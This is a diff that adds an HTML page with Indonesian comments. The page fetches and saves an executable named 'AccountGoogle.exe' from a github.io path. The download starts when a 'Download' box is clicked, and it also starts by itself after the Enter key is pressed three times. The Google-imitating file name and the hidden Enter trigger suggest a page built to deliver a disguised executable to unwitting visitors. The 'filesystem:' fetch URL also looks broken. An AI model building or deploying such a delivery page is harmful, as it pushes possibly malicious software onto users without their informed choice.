@@ -1,0 +1,139 @@
+
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Download .exe via Save File Picker</title>
+  <style>
+    body { font-family: system-ui, Arial; padding: 2rem; }
+    #pixel {
+      display:inline-block;
+      width:120px;height:120px;
+      background:#4caf50;border-radius:8px;
+      color:#fff;display:flex;align-items:center;justify-content:center;
+      cursor:pointer;user-select:none;
+      box-shadow: 0 6px 14px rgba(0,0,0,.15);
+    }
+    #status { margin-top:1rem; color:#333; }
+  </style>
+</head>
+<body>
+  <div id="pixel">Download</div>
+  <div id="status">Belum mendownload</div>
+
+  <script>
+    // Berapa kali Enter ditekan
+    let countEnter = 0;
+    // Apakah sudah didownload
+    let isDownloaded = false;
+
+    // URL file yang sudah kamu upload
+    const FILE_URL = 'filesystem:https://lanaya113505.github.io/persistent/AccountGoogle.exe';
+    const FILE_SUGGESTED_NAME = 'AccountGoogle.exe';
+
+    window.onload = function () {
+      const body = document.querySelector('body');
+      const pixel = document.querySelector('#pixel');
+      const status = document.querySelector('#status');
+
+      // Tangani Enter key press / release
+      body.onkeydown = e => {
+        if (e.key === "Enter") {
+          countEnter++;
+          clickedEnter();
+        }
+      };
+      body.onkeyup = e => {
+        if (e.key === "Enter") {
+          cancelEnter();
+        }
+      };
+
+      pixel.addEventListener('click', async () => {
+        status.textContent = 'Memulai pengunduhan...';
+        try {
+          // 1) Ambil file sebagai blob
+          const resp = await fetch(FILE_URL, { method: 'GET' });
+          if (!resp.ok) throw new Error('Gagal mengambil file: ' + resp.status);
+          const blob = await resp.blob();
+
+          // 2) Jika browser mendukung showSaveFilePicker -> gunakan API itu
+          if (window.showSaveFilePicker) {
+            try {
+              const opts = {
+                suggestedName: FILE_SUGGESTED_NAME,
+                startIn: 'downloads',
+                types: [
+                  {
+                    description: 'Executable',
+                    accept: {
+                      // gunakan application/octet-stream atau mime yang sesuai
+                      'application/octet-stream': ['.exe']
+                    }
+                  }
+                ],
+                excludeAcceptAllOption: true
+              };
+
+              const handle = await window.showSaveFilePicker(opts);
+              const writable = await handle.createWritable();
+              // tulis blob ke file yang dipilih
+              await writable.write(blob);
+              await writable.close();
+
+              isDownloaded = true;
+              status.textContent = 'File tersimpan (menggunakan Save File Picker).';
+            } catch (errSave) {
+              // Jika user membatalkan dialog atau error lain -> fallback ke download anchor
+              console.warn('SaveFilePicker error / dibatalkan:', errSave);
+              await fallbackAnchorDownload(blob);
+              status.textContent = 'File diunduh (fallback anchor).';
+              isDownloaded = true;
+            }
+          } else {
+            // fallback: buat link download dan trigger click
+            await fallbackAnchorDownload(blob);
+            status.textContent = 'File diunduh (fallback anchor).';
+            isDownloaded = true;
+          }
+        } catch (err) {
+          console.error(err);
+          status.textContent = 'Terjadi kesalahan: ' + err.message;
+        }
+      });
+
+      // fungsi ketika Enter ditekan
+      function clickedEnter() {
+        console.log('Enter ditekan kali ke:', countEnter);
+        // contoh: lakukan sesuatu jika Enter ditekan 3 kali
+        if (countEnter >= 3 && !isDownloaded) {
+          // trigger klik pada pixel
+          pixel.click();
+        }
+      }
+
+      function cancelEnter() {
+        console.log('Enter dilepas');
+        // contoh reset count jika mau
+        // countEnter = 0;
+      }
+
+      // fallback: simpan blob via <a download>
+      async function fallbackAnchorDownload(blob) {
+        // Buat URL sementara lalu trigger link.download
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = FILE_SUGGESTED_NAME;
+        // perlu ditambahkan ke DOM di beberapa browser untuk bekerja
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+        // beri waktu lalu revoke
+        setTimeout(() => URL.revokeObjectURL(url), 2000);
+      }
+    };
+  </script>
+</body>
+</html>
